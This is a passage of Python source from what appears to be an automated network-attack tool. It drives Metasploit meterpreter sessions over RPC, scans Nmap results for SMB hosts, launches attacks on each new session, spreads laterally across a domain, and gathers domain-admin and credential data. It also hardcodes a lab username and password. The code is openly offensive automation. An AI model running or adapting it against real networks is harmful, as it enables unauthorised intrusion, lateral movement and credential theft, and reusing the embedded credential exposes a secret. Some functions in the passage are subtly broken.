    if b'errors' in sess_data[sess_num]:

        # Session timed out on initial sysinfo cmd
        if b'domain' not in sess_data[sess_num]:
            return True

        # Session abruptly died
        msgs = ['abrupt death of session', 'unknown session id']
        #with await lock:
        for err in sess_data[sess_num][b'errors']:
            if len([m for m in msgs if m in err.lower()]) > 0:
                return True

        # Session timed out
        if 'Rex::TimeoutError' in sess_data[sess_num][b'errors']:
            return True

    return False

async def add_session_keys(msf_sess, sess_data, msf_sess_num):
    for k in sess_data[msf_sess_num]:
        if k not in msf_sess:
            msf_sess[k] = sess_data[msf_sess_num].get(k)

    return session

async def get_sessions(lock, client, domain_data, sess_data):
    print_waiting = True
    sleep_secs = 2

    ## exists for potential debug purposes ##
    counter = 0
    if counter > 30:
        # Yes this is public information but just here for debugging
        domain_data['creds'].append('lab2\\dan.da:Qwerty1da')
    #########################################

    while True:
        # Get list of MSF sessions from RPC server
        msf_sessions = client.call('session.list')

        for msf_sess_num in msf_sessions:
            # Do stuff with session
            if msf_sess_num not in sess_data:
                update_session(msf_sessions[msf_sess_num], msf_sess_num, sess_data)
                print_waiting = False

                # Attack!
                asyncio.ensure_future(attack_with_session(
                                                          lock,
                                                          client,
                                                          msf_sess_num,
                                                          sess_data,
                                                          domain_data))

        busy_sess = False
        with await lock:
            for n in sess_data:
                if b'busy' in sess_data[n]:
                    if sess_data[n][b'busy'] == b'True':
                        busy_sess = True
                        print_waiting = True
                        break

        if busy_sess == False:
            if print_waiting:
                print_waiting = False
                print_info('Waiting on new meterpreter session', None, None)

        await asyncio.sleep(1)

        counter += 1 # here for potential debug purposes

def parse_hostlist(domain_data):
    hosts = []

    if args.xml:
        try:
            report = NmapParser.parse_fromfile(args.xml)
            for host in report.hosts:
                if host.is_up():
                    for s in host.services:
                        if s.port == 445:
                            if s.state == 'open':
                                host = host.address
                                if host not in hosts:
                                    hosts.append(host)
        except FileNotFoundError:
            print_bad('Host file not found: {}'.format(args.xml), None, None)
            sys.exit()

    elif args.hostlist:
        try:
            with open(args.hostlist, 'r') as hostlist:
                host_lines = hostlist.readlines()
                for line in host_lines:
                    line = line.strip()
                    try:
                        if '/' in line:
                            hosts += [str(ip) for ip in IPNetwork(line)]
                        elif '*' in line:
                            print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24', None, None)
                            sys.exit()
                        else:
                            hosts.append(line)
                    except (OSError, AddrFormatError):
                        print_bad('Error importing host list file. Are you sure you chose the right file?', None, None)
                        sys.exit()
        except FileNotFoundError:
            print_bad(args.hostlist+' not found', None, None)
            sys.exit()

    domain_data['hosts'] = hosts

async def attack_with_session(lock, client, sess_num, sess_data, domain_data):

    task = await sess_first_check(client, sess_num, sess_data, domain_data)
    if task:
        await asyncio.wait(task)

    if is_session_broken(lock, sess_num, sess_data) == False:
        await attack(client, sess_num, sess_data, domain_data)


def main():

    lock = asyncio.Lock()
    client = msfrpc.Msfrpc({})
    sess_data = {}
    domain_data = {'domain':None,
                   'domain_admins':[],
                   'domain_controllers':[],
                   'high_priority_ips':[],
                   'creds':[],
                   'checked_creds':{},
                   'hosts':[]}

    if args.hostlist or args.xml:
        parse_hostlist(domain_data)

    try:
        client = get_perm_token(client)
    except:
        print_bad('Failed to connect to MSF RPC server,'
                  'are you sure you have the right password?', None, None)
        sys.exit()

    c_ids = get_console_ids(client)
    lhost = get_local_ip(get_iface())

    loop = asyncio.get_event_loop()
    loop.add_signal_handler(signal.SIGINT, kill_tasks)

    fut_check_sessions = asyncio.ensure_future(get_sessions(lock,
                                                            client,
                                                            domain_data,
                                                            sess_data))


    fut_spread = asyncio.ensure_future(spread(lock,
                                              client,
                                              c_ids,
                                              lhost,
                                              sess_data,
                                              domain_data))

    try:
#        loop.run_until_complete(fut_check_sessions, fut_attack, fut_spread)
        loop.run_until_complete(asyncio.gather(fut_check_sessions, fut_spread))
    except asyncio.CancelledError:
        print_info('Tasks gracefully smited.', None, None)
    finally:
        loop.close()

if __name__ == "__main__":
    args = parse_args()
#    if os.geteuid():
#        print_bad('Run as root', None, None)
#        sys.exit()
    main()

## Left off
# 772
# debugging why we get multi shells all the time
# probably because spread is a future and attack_with_session is a future too
# so domain_data is not being updated fast enough and we're looping into spread() over and over
# before we're done adding ['admin_shell'] to sess_data
